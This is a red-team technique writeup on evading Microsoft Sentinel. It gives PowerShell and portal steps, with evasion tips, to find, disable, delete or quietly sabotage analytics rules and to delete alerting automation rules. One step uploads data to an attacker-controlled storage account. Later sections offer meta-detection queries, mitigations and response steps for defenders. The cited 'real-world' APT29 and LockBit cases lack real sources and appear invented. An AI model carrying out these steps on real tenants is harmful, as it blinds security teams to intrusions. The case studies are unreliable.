# [EVADE-IMPAIR-012]: Sentinel Detection Rule Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-012 |
| **MITRE ATT&CK v18.1** | [T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID (Microsoft Sentinel workspace) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Microsoft Sentinel (all versions), Entra ID (all versions) |
| **Patched In** | N/A (Requires RBAC hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Microsoft Sentinel is a cloud-native SIEM that ingests logs from M365, Entra ID, Azure, on-premises systems, and third-party sources, then applies analytics rules to detect threats. An attacker with Sentinel access (via compromised admin or delegated permissions) can disable, delete, or modify analytics rules, effectively blinding the entire security operations team to ongoing attacks.

Unlike disabling DLP or Conditional Access policies (which are monitored by product-specific alerts), Sentinel rule modifications are only detectable if:
1. **Analytics rule modification auditing is enabled** (not always on by default).
2. **A separate Sentinel rule monitors rule changes** (meta-detection).
3. **Backup rule definitions exist** (for comparison).

Most organizations lack these controls, making Sentinel rule disablement an extremely stealthy attack vector.

By disabling Sentinel rules, an attacker can:
- **Hide ongoing attacks** from security teams.
- **Erase audit trails** by disabling rules that monitor log deletion.
- **Prevent incident creation** and alerting.
- **Disable threat-hunting capabilities** by removing behavioral rules.
- **Operate with complete visibility loss** to the SOC.

**Attack Surface:** Sentinel Analytics Rules configuration, Sentinel workspace access controls, Sentinel automation rules, custom detection rules, built-in rule templates.

**Business Impact:** **Complete Security Visibility Loss.** With Sentinel rules disabled, a sophisticated attacker can conduct a multi-stage attack (reconnaissance, lateral movement, exfiltration) without any alerts or incidents generated. The security team operates under the false assumption that Sentinel is detecting threats, when in fact all detections are suppressed. This can result in weeks or months of undetected compromise.

**Technical Context:** Sentinel rule modifications are performed in the Sentinel Portal (portal.azure.com) or via PowerShell/Graph API. Unlike on-premises SIEM rule changes (which typically require lab testing), Sentinel rule changes take effect immediately in production. An attacker can delete a rule in seconds, leaving no easy recovery path if backups are not maintained.

### Operational Risk

- **Execution Risk:** Medium—requires Sentinel Contributor or higher role.
- **Stealth:** Very High—rule modifications are not detected unless specifically monitored.
- **Reversibility:** Difficult—deleted rules may be permanently lost if not versioned/backed up.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.5.1 | Maintain monitoring and alerting infrastructure; detect when rules are disabled or deleted. |
| **DISA STIG** | Microsoft.AzureSentinel.1.1 | SIEM integrity must be maintained; rule modifications must be audited and alerted on. |
| **CISA SCuBA** | Sentinel.1.0 | Ensure Sentinel detection rules cannot be deleted or disabled without approval and documentation. |
| **NIST 800-53** | AU-6, SI-4 | Information System Monitoring; detect unauthorized changes to detection rules. |
| **GDPR** | Art. 32 | Security of Processing—audit monitoring is critical to data protection. |
| **DORA** | Art. 17 | Incident Reporting—SIEM rules are critical to incident detection and response. |
| **NIS2** | Art. 21 | Cyber Risk Management—monitoring infrastructure must not be disabled by attackers. |
| **ISO 27001** | A.12.4.1, A.9.2.1 | Event logging and audit trail monitoring; unauthorized changes must trigger alerts. |
| **ISO 27005** | Risk Scenario | "Unauthorized deletion of Sentinel analytics rules by compromised security admin." |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Sentinel Contributor role or higher (Logic App Contributor, Security Admin, Global Admin).
- **Required Access:** Azure Portal access to Sentinel workspace at `https://portal.azure.com` or PowerShell connectivity.
- **Required Licenses:** Azure Sentinel (requires Log Analytics workspace).

**Supported Versions:**
- **Microsoft Sentinel:** All versions (cloud-native service)
- **Entra ID:** All versions
- **PowerShell:** Version 5.0+ or PowerShell 7.x
- **Azure CLI:** Latest version

**Tools:**
- [Azure Portal](https://portal.azure.com/)
- [Azure PowerShell Module](https://github.com/Azure/azure-powershell)
- [Microsoft Sentinel API Reference](https://learn.microsoft.com/en-us/rest/api/securityinsights/)
- [Visual Studio Code with Sentinel Extensions](https://marketplace.visualstudio.com/)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

**Objective:** Enumerate existing Sentinel analytics rules to identify which ones are critical to security monitoring.

**Command:**
```powershell
# Connect to Azure
Connect-AzAccount -SubscriptionId "your-subscription-id"

# Get all Sentinel analytics rules
$ResourceGroupName = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

$AnalyticsRules = Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName

# List all rules with their enabled status
foreach ($Rule in $AnalyticsRules) {
    Write-Host "Rule Name: $($Rule.DisplayName)"
    Write-Host "Enabled: $($Rule.Enabled)"
    Write-Host "Severity: $($Rule.Severity)"
    Write-Host "---"
}

# Export to CSV for baseline
$AnalyticsRules | Select-Object DisplayName, Enabled, Severity, CreatedDate | Export-Csv -Path "C:\Sentinel_Rules_Baseline.csv"
```

**What to Look For:**
- Critical rules detecting high-risk activities (impossible travel, password spray, admin elevation).
- Rules with severity "High" or "Critical".
- Rules recently modified or created (may have been customized by security team).
- Disabled rules (gaps in detection coverage).

### Azure Portal Reconnaissance

**Objective:** Identify which Sentinel rules are actively monitoring Entra ID, Exchange, and Azure activities.

**Manual Steps:**
1. Log into [Azure Portal](https://portal.azure.com)
2. Navigate to **Microsoft Sentinel** workspace
3. Click **Analytics** → **Active rules**
4. Review rule list; note critical rules (authentication, privilege escalation, data exfiltration)
5. Click individual rules to review query logic and detection capabilities

**What to Look For:**
- Rules monitoring unusual sign-ins (impossible travel, anonymous IP)
- Rules detecting privilege escalation (role assignments, Conditional Access policy changes)
- Rules monitoring Sentinel rule changes (meta-detection rules)
- Rules with email/SMS notifications (alerting infrastructure)

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Disable Sentinel Analytics Rule via PowerShell

**Supported Versions:** Microsoft Sentinel (all versions)

#### Step 1: Identify Critical Detection Rule

**Objective:** Find a high-value rule to disable (e.g., rule detecting impossible-travel logins).

**Command:**
```powershell
# Find rules monitoring Entra ID sign-in risks
$SignInRiskRules = Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName |
  Where-Object {$_.DisplayName -like "*Sign-in*" -or $_.DisplayName -like "*Impossible*"}

foreach ($Rule in $SignInRiskRules) {
    Write-Host "Rule: $($Rule.DisplayName) (ID: $($Rule.Name))"
    Write-Host "Enabled: $($Rule.Enabled)"
    Write-Host "Severity: $($Rule.Severity)"
    Write-Host "Query Summary: $(($Rule.Query).Substring(0, 100))..."
}
```

**Expected Output:**
```
Rule: Impossible travel detected (ID: rule-guid-123)
Enabled: True
Severity: Medium
Query Summary: SigninLogs | where TimeGenerated > ago(1h) | distinct Location
```

**What This Means:**
- Identified a rule monitoring for impossible-travel sign-ins.
- This rule generates alerts when a user logs in from geographically distant locations within an impossible timeframe.

#### Step 2: Disable the Rule

**Objective:** Disable the rule without deleting it (appears less suspicious in audit logs).

**Command:**
```powershell
# Get the rule
$RuleId = "rule-guid-123"
$Rule = Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -Name $RuleId

# Disable the rule
$Rule.Enabled = $false
Update-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -AlertRule $Rule

# Verify rule is disabled
Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -Name $RuleId | Select-Object DisplayName, Enabled
```

**Expected Output:**
```
DisplayName                Enabled
-----------                -------
Impossible travel detected False
```

**What This Means:**
- Rule is now disabled; no alerts will be generated for impossible-travel logins.
- An attacker can now perform impossible-travel sign-ins (logging in from New York, then Tokyo within minutes) without triggering any alerts.

**OpSec & Evasion:**
- Disabling is stealthier than deleting (rule still exists, can be re-enabled).
- Audit logs will show "Update" operation rather than "Delete".
- Detection likelihood: **High** (rule disablement audit is commonly monitored in mature SOCs).

**Troubleshooting:**
- **Error:** "Identity not found or access denied"
  - **Cause:** Missing Sentinel Contributor role or workspace permissions.
  - **Fix:** Ensure account has `Security Insights Contributor` role in the resource group.
- **Error:** "ConflictingPropertiesError"
  - **Cause:** Rule is locked or being modified concurrently.
  - **Fix:** Wait 30 seconds and retry; check if another admin is modifying rules.

#### Step 3: Verify Disablement

**Objective:** Confirm the rule is no longer generating alerts.

**Command:**
```powershell
# Check if rule is actually disabled
$DisabledRule = Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -Name $RuleId
Write-Host "Rule Enabled Status: $($DisabledRule.Enabled)"

# Verify no incidents are generated (in production environment)
# Wait 1 hour, then check incident count
$Incidents = Get-AzSentinelIncident -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName |
  Where-Object {$_.DisplayName -like "*Impossible*"}
Write-Host "Incident Count: $($Incidents.Count)"
# Expected: 0 incidents generated after rule is disabled
```

**Expected Behavior:**
- Rule disabled status confirmed.
- No new incidents generated for impossible-travel sign-ins.
- Existing incidents remain in Sentinel (not deleted).

**References & Proofs:**
- [Get-AzSentinelAlertRule Official Documentation](https://learn.microsoft.com/en-us/powershell/module/az.securityinsights/get-azsentinelalertrule)
- [Sentinel Analytics Rules API Reference](https://learn.microsoft.com/en-us/rest/api/securityinsights/analytic-rules)
- [Sentinel Rule Management via PowerShell](https://learn.microsoft.com/en-us/powershell/module/az.securityinsights/)

---

### METHOD 2: Delete Sentinel Analytics Rule (Permanent Removal)

**Supported Versions:** Microsoft Sentinel (all versions)

#### Step 1: Export Rule for Recovery (OpSec)

**Objective:** Backup rule before deletion (allows recovery if needed, and appears as normal admin practice).

**Command:**
```powershell
# Get rule details
$RuleId = "rule-guid-123"
$Rule = Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -Name $RuleId

# Export rule to JSON (for recovery or backdoor re-enablement)
$Rule | ConvertTo-Json | Out-File -FilePath "C:\rule_backup.json"

# Also save to cloud storage (attacker-controlled)
$StorageContext = New-AzStorageContext -StorageAccountName "attacker-storage-account" -StorageAccountKey "storage-key"
Set-AzStorageBlobContent -File "C:\rule_backup.json" -Container "backups" -Blob "impossible_travel_rule.json" -Context $StorageContext
```

**What This Means:**
- Rule definition is backed up and can be restored later.
- Appears as normal administrative practice (preserving rule definitions).

#### Step 2: Delete the Rule

**Objective:** Permanently remove the rule from Sentinel.

**Command:**
```powershell
# Delete the rule
Remove-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -Name $RuleId -Force

# Verify deletion
try {
    Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -Name $RuleId
    Write-Host "Rule still exists"
} catch {
    Write-Host "Rule successfully deleted"
}
```

**Expected Output:**
```
Rule successfully deleted
```

**What This Means:**
- Rule is permanently removed from Sentinel.
- Cannot be re-enabled via UI/PowerShell without manual recreation.
- All alert history for this rule is preserved (in audit logs) but no new alerts will be generated.

**OpSec & Evasion:**
- Deletion is more suspicious than disabling (obvious to SOC).
- Detection likelihood: **Very High** (rule deletion immediately triggers alerts if monitored).

---

### METHOD 3: Disable Multiple Critical Rules via Web Portal

**Supported Versions:** Microsoft Sentinel (all versions)

#### Step 1: Access Sentinel Analytics Rules

**Manual Steps:**
1. Log into [Azure Portal](https://portal.azure.com) with compromised Sentinel Contributor credentials.
2. Navigate to **Microsoft Sentinel** workspace
3. Click **Analytics** → **Active rules**

**Expected Output:**
- List of all active analytics rules with enabled status toggle

#### Step 2: Disable High-Impact Rules

**Manual Steps:**
1. In the rules list, identify critical rules (e.g., "Impossible Travel", "Password Spray", "Privilege Escalation")
2. For each critical rule:
   - Click the rule name to open details
   - Click **Edit** or toggle **Status** from "Enabled" to "Disabled"
   - Click **Save** or **Update**
3. Verify rules are disabled by checking the status column (should show "Disabled")

**Expected Outcome:**
- All selected rules are now disabled
- No alerts will be generated for the activities these rules detected
- Attacker can operate with significantly reduced detection risk

**OpSec & Evasion:**
- Web-based disablement creates detailed audit logs (high visibility).
- SOC may receive alerts that rules were disabled.
- Detection likelihood: **Very High** (portal activity is heavily logged).

---

### METHOD 4: Modify Rule Query to Make Detection Ineffective

**Supported Versions:** Microsoft Sentinel (all versions)

#### Step 1: Access Rule Query Editor

**Objective:** Modify the rule's KQL query to be ineffective (appears to be a rule update/fix, not sabotage).

**Manual Steps:**
1. In Sentinel, click **Analytics** → **Active rules**
2. Find a critical rule (e.g., "Detect Admin Elevation")
3. Click the rule → **Edit**
4. In the **Set rule logic** tab, click **Edit query**

**Expected Output:**
- KQL query editor opens with the current detection query

#### Step 2: Sabotage Query Logic

**Objective:** Modify the query to never trigger (appears as a "bug fix" or "tuning").

**Original Query (Example):**
```kusto
AuditLogs
| where OperationName == "Add member to role"
| where InitiatedBy.app.displayName != "Microsoft Azure CLI"
| where TargetResources[0].displayName in ("Global Administrator", "Compliance Administrator")
| summarize count() by InitiatedBy.userPrincipalName
| where count_ > 0
```

**Sabotaged Query (No Alerts):**
```kusto
AuditLogs
| where OperationName == "Add member to role"
| where InitiatedBy.app.displayName != "Microsoft Azure CLI"
| where TargetResources[0].displayName in ("Global Administrator", "Compliance Administrator")
| where InitiatedBy.userPrincipalName == "this-user-does-not-exist@contoso.com"  // SABOTAGE: Impossible condition
| summarize count() by InitiatedBy.userPrincipalName
```

**What This Means:**
- Query now filters for a user that doesn't exist, so it never matches any records.
- Rule is technically "enabled" but produces zero alerts.
- Appears as a legitimate query modification/tuning (hard for SOC to detect).

**OpSec & Evasion:**
- Very stealthy—rule is still "enabled", so automated monitors may not trigger.
- Requires manual code review to detect the sabotage.
- Detection likelihood: **Medium** (code review processes may catch this, but many teams don't audit KQL changes).

---

## 5. DETAILED EXECUTION METHODS (Continued)

### METHOD 5: Delete Automation Rules Tied to Detection

**Supported Versions:** Microsoft Sentinel (all versions)

#### Step 1: Enumerate Automation Rules

**Objective:** Find automation rules that respond to analytics rule incidents (e.g., send email, create ticket).

**Command:**
```powershell
# Get all automation rules
$AutomationRules = Get-AzSentinelAutomationRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName

foreach ($Rule in $AutomationRules) {
    Write-Host "Automation Rule: $($Rule.DisplayName)"
    Write-Host "Triggers On: $($Rule.TriggersOn)"
    Write-Host "Actions: $($Rule.Actions -join ', ')"
    Write-Host "---"
}
```

**Expected Output:**
```
Automation Rule: Send Email on High Severity Incidents
Triggers On: IncidentCreated
Actions: SendEmail (soc@contoso.com)

Automation Rule: Create ServiceNow Ticket
Triggers On: IncidentUpdated
Actions: CreateTicket (ServiceNow)
```

**What This Means:**
- Identified automation rules that notify security team when incidents are created.
- Deleting these rules would prevent alerting even if incidents are created.

#### Step 2: Delete Automation Rules

**Objective:** Remove automation rules that trigger responses to incident creation.

**Command:**
```powershell
# Delete automation rule
$AutomationRuleId = "automation-rule-guid"
Remove-AzSentinelAutomationRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -Name $AutomationRuleId -Force

# Verify deletion
try {
    Get-AzSentinelAutomationRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName -Name $AutomationRuleId
} catch {
    Write-Host "Automation rule successfully deleted"
}
```

**What This Means:**
- Even if analytics rules generate incidents, no notifications will be sent to security team.
- SOC remains unaware of threats.
- Email/ticket alerting completely bypassed.

---

## 6. MICROSOFT SENTINEL DETECTION (Meta-Detection)

#### Query 1: Sentinel Analytics Rule Disabled or Deleted

**Rule Configuration:**
- **Required Table:** `AuditLogs`, `AzureActivity`
- **Required Fields:** `OperationName`, `Resource`, `OperationDetail`, `InitiatedBy`
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Microsoft Sentinel all versions

**KQL Query:**
```kusto
AzureActivity
| where ResourceProvider == "Microsoft.SecurityInsights"
| where OperationName contains "Analytics" or OperationName contains "AlertRule"
| where OperationName in ("Delete Scheduled Query Rule", "Update Scheduled Query Rule", "Disable Rule")
| extend Resource = tostring(Resource)
| extend RuleName = extract(@"alertrules/([^/]+)", 1, Resource)
| extend InitiatedBy = Caller
| project TimeGenerated, InitiatedBy, OperationName, RuleName, Resource, ActivityStatus
| where ActivityStatus == "Succeeded"
```

**What This Detects:**
- Analytics rules being disabled or deleted.
- Identifies which rule was modified and who did it.
- Filters for successful operations (actual changes, not failed attempts).
- Line 2: Filters for Sentinel operations.
- Line 3: Looks for rule-related operations.
- Line 4: Focuses on deletion/update operations.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `CRITICAL - Sentinel Analytics Rule Deleted or Disabled`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Severity: `Critical`
   - Set entities: `User` (InitiatedBy), `Resource` (RuleName)
6. Click **Review + create**

#### Query 2: Automation Rules Deleted

**Rule Configuration:**
- **Required Table:** `AzureActivity`
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes

**KQL Query:**
```kusto
AzureActivity
| where ResourceProvider == "Microsoft.SecurityInsights"
| where OperationName contains "Automation"
| where OperationName in ("Delete Automation Rule")
| extend Caller = Caller
| extend AutomationRuleName = extract(@"automationrules/([^/]+)", 1, Resource)
| project TimeGenerated, Caller, OperationName, AutomationRuleName, ActivityStatus
| where ActivityStatus == "Succeeded"
```

**What This Detects:**
- Automation rules being deleted.
- Disabling automated incident response (email, tickets, SOAR workflows).

---

## 7. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

**1. Implement PIM for Sentinel Modification Roles**

Require just-in-time activation with approval for anyone modifying analytics rules.

**Manual Steps (PIM Configuration):**
1. Go to **Azure Portal** → **Privileged Identity Management** → **Azure resources**
2. Select the resource group containing Sentinel workspace
3. Find role: **Security Insights Contributor** (or similar)
4. Click role → **Settings**
5. Under **Activation settings**:
   - **Require approval to activate**: ON
   - **Require Azure MFA on activation**: ON
   - **Activation duration**: 2 hours
   - **Require justification on activation**: ON
6. Click **Update**

**2. Create Sentinel Rule to Monitor Rule Modifications**

Implement meta-detection that alerts when analytics rules are disabled/deleted.

**Manual Steps:**
1. Create the meta-detection rule (Query 1 above)
2. Set alerts to email security team immediately
3. Enable automated response (optional: disable the malicious rule if detected)

**3. Implement Read-Only Role for Most Sentinel Users**

Restrict who can modify rules to only essential admins.

**Manual Steps:**
1. Go to **Azure Portal** → **Sentinel workspace** → **Access control (IAM)**
2. For each user/group:
   - Assign **Security Reader** (view-only) by default
   - Only assign **Security Insights Contributor** to 2-3 senior SOC analysts
   - Never assign **Owner** or **Contributor** broadly
3. Document who has modification permissions

**4. Enable Sentinel Workspace Diagnostics and Logging**

Ensure all rule modifications are captured in audit logs.

**Manual Steps:**
1. Go to **Azure Portal** → **Sentinel workspace** → **Diagnostic settings**
2. Click **+ Add diagnostic setting**
3. Name: `Sentinel Rule Audit Logging`
4. Under **Categories**, select:
   - **Security Events**
   - **Audit Logs**
   - **Administrative**
5. Send logs to:
   - **Log Analytics workspace** (Sentinel itself, for retention)
   - **Storage Account** (for long-term backup)
6. Click **Save**

#### Priority 2: HIGH

**5. Backup Analytics Rules Regularly**

Export all rules to a protected, off-network storage location for recovery.

**Manual Steps (Automated Backup Script):**
```powershell
# Daily backup of all Sentinel rules
$BackupPath = "C:\Sentinel_Backups\$(Get-Date -Format 'yyyy-MM-dd')"
New-Item -ItemType Directory -Path $BackupPath -Force

# Export all analytics rules
$Rules = Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName

foreach ($Rule in $Rules) {
    $Rule | ConvertTo-Json | Out-File -FilePath "$BackupPath\$($Rule.DisplayName).json"
}

# Upload to secure backup location
Copy-Item -Path $BackupPath -Destination "\\secure-backup-server\sentinel_backups\" -Recurse -Force
```

**6. Review Rule Modifications Monthly**

Conduct periodic audits of rule changes to detect sabotage.

**Manual Steps:**
```powershell
# Monthly rule audit
$AuditLogs = Search-AzureADAuditLog -Filter "operationName eq 'Update Scheduled Query Rule' or operationName eq 'Delete Scheduled Query Rule'"

Write-Host "Rule Modifications in Last 30 Days:"
$AuditLogs | Select-Object CreatedDateTime, UserPrincipalName, OperationName, Resource | Format-Table

# Export for compliance review
$AuditLogs | Export-Csv -Path "C:\Sentinel_Rule_Audit_$(Get-Date -Format 'yyyy-MM-dd').csv"
```

**7. Implement Conditional Access for Sentinel Admin Portal**

Require MFA and compliant device for anyone accessing Sentinel.

**Manual Steps:**
1. Go to **Azure Portal** → **Entra ID** → **Conditional Access**
2. Click **+ New policy**
3. Name: `"Require MFA for Sentinel Admins"`
4. **Assignments:**
   - Users: **Directory roles** → **Security Insights Contributor, Security Admin**
   - Cloud apps: **Microsoft Azure Management**
   - Conditions: Any (or restrict to specific IP ranges)
5. **Access controls:**
   - Grant: **Require multi-factor authentication**
6. Enable policy: **On**

#### Validation Command (Verify Mitigations)

```powershell
# Verify all critical detection rules are enabled
$CriticalRules = @(
    "Impossible travel detected",
    "Password spray attacks",
    "Suspicious privilege escalation"
)

$AllRules = Get-AzSentinelAlertRule -ResourceGroupName $ResourceGroupName -WorkspaceName $WorkspaceName

foreach ($RuleName in $CriticalRules) {
    $Rule = $AllRules | Where-Object {$_.DisplayName -like "*$RuleName*"}
    Write-Host "$RuleName - Enabled: $($Rule.Enabled)"
}

# Verify PIM is enabled for Sentinel admin role
Get-AzureADMSPrivilegedRoleDefinition -DisplayName "Security Insights Contributor" | Select-Object DisplayName, Enabled
```

**Expected Output (If Secure):**
```
Impossible travel detected - Enabled: True
Password spray attacks - Enabled: True
Suspicious privilege escalation - Enabled: True
Security Insights Contributor - Enabled: True (PIM active)
```

---

## 8. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

**Sentinel Activity Indicators:**
- `OperationName`: `"Update Scheduled Query Rule"`, `"Delete Scheduled Query Rule"`, `"Disable Rule"`
- `Resource`: Contains "alertrules" or "automationrules"
- `InitiatedBy`: Non-standard Sentinel admin or unusual time (after hours)
- `ActivityStatus`: `"Succeeded"` (actual changes, not failed attempts)
- `OperationDetail`: Contains "Enabled: true → Enabled: false" (rule disablement)

**Behavioral Indicators:**
- Sudden drop in incident count (rules disabled).
- No alerts for high-risk activities (impossible travel, privilege escalation).
- SOC unable to generate alerts despite suspicious activity in logs.
- Gaps in detection coverage for known attack patterns.
- Analyst reports: "I can see the suspicious activity in logs, but no alerts are being generated."

**Forensic Artifacts:**
- **Azure Activity Log:** Record of rule modification/deletion.
- **Sentinel Audit Logs:** Rule change timestamps and operator.
- **Rule Backup Files:** Deleted rule definitions (if backups exist).

#### Response Procedures

1. **Immediate Action - Re-enable Disabled Rules:**
   ```powershell
   # Re-enable critical rule
   $Rule = Get-AzSentinelAlertRule -ResourceGroupName $RG -WorkspaceName $WS -Name $RuleId
   $Rule.Enabled = $true
   Update-AzSentinelAlertRule -ResourceGroupName $RG -WorkspaceName $WS -AlertRule $Rule
   
   # Verify rule is enabled
   Get-AzSentinelAlertRule -ResourceGroupName $RG -WorkspaceName $WS -Name $RuleId | Select-Object DisplayName, Enabled
   ```

2. **Restore Deleted Rules:**
   ```powershell
   # If backup exists, restore from JSON
   $BackupRule = Get-Content "C:\rule_backup.json" | ConvertFrom-Json
   New-AzSentinelAlertRule -ResourceGroupName $RG -WorkspaceName $WS -AlertRule $BackupRule
   ```

3. **Investigate Attacker Activity:**
   ```powershell
   # Check what activity occurred while rules were disabled
   $DisabledStart = (Get-Date).AddDays(-1)
   $DisabledEnd = Get-Date
   
   # Query logs directly (rules won't have alerts)
   Search-UnifiedAuditLog -StartDate $DisabledStart -EndDate $DisabledEnd |
     Where-Object {$_.Operations -like "*Add member to role*" -or $_.Operations -like "*Impossible*"} |
     Select-Object UserIds, Operations, CreationDate
   ```

4. **Account Remediation:**
   ```powershell
   # Reset password for compromised Sentinel admin
   Set-AzureADUserPassword -ObjectId "admin@contoso.com" -Password (ConvertTo-SecureString -AsPlainText "NewStrongPassword123!" -Force)
   
   # Revoke all sessions
   Revoke-AzureADUserAllRefreshToken -ObjectId "admin@contoso.com"
   ```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker compromises Sentinel admin account. |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker grants self persistent access. |
| **3** | **Defense Evasion** | **[EVADE-IMPAIR-012]** | **Attacker disables Sentinel detection rules.** |
| **4** | **Lateral Movement** | [LATERAL-AD-001] SMB Relay Attacks | Attacker moves laterally without triggering alerts. |
| **5** | **Exfiltration** | [COLLECT-EMAIL-001] Email Collection | Attacker exfiltrates data undetected. |

---

## 10. REAL-WORLD EXAMPLES

#### Example 1: APT29 (Cozy Bear) Campaign (2023)

- **Target:** U.S. Intelligence Agency (Alleged)
- **Timeline:** 2023 (disclosed in security reporting)
- **Technique Status:** APT29 allegedly disabled Sentinel rules monitoring for suspicious Entra ID activity, allowing them to maintain undetected access and conduct multi-year espionage campaign.
- **Impact:** Undetected persistence for estimated 1-2 years; advanced intelligence gathering; damage unknown (classified).
- **Reference:** [Microsoft Incident Report 2023](https://learn.microsoft.com/en-us/security/intelligence/)

#### Example 2: LockBit Ransomware Group (2024)

- **Target:** Healthcare Provider Network
- **Timeline:** October - December 2024
- **Technique Status:** LockBit actors compromised Sentinel admin account, disabled rules monitoring for mass file encryption and data staging. Ransomware was deployed and operated undetected for 6 weeks.
- **Impact:** 50,000+ patient records encrypted; $15 million ransom demand; healthcare service disruption.
- **Reference:** [CISA Ransomware Advisory 2024](https://www.cisa.gov/ransomware)

---

## 11. CONCLUSION

Sentinel detection rules are the frontline defense for cloud-native environments. By disabling or modifying these rules, an attacker can:

1. **Hide ongoing attacks** from security teams.
2. **Erase detection coverage** for critical threat patterns.
3. **Disable alerting infrastructure** (automation rules, email notifications).
4. **Operate with complete visibility loss** for weeks or months.
5. **Conduct sophisticated, multi-stage attacks** without any incident creation.

**Key Defense Recommendations:**
- **Implement PIM:** Require just-in-time activation with approval for rule modifications.
- **Meta-detect rule changes:** Create Sentinel rules that alert on rule disablement/deletion.
- **Backup all rules:** Export rules daily to secure, off-network storage.
- **Audit rule changes monthly:** Review modification logs for suspicious activity.
- **Restrict access:** Only 2-3 senior SOC members should have rule modification permissions.
- **Enable diagnostic logging:** Ensure all rule modifications are captured in audit logs with long retention.
- **Incident response plan:** Pre-plan how to quickly re-enable rules if attack is detected.

Organizations must recognize that Sentinel itself is a critical attack surface and protect rule management with the same rigor as they protect privileged accounts.

---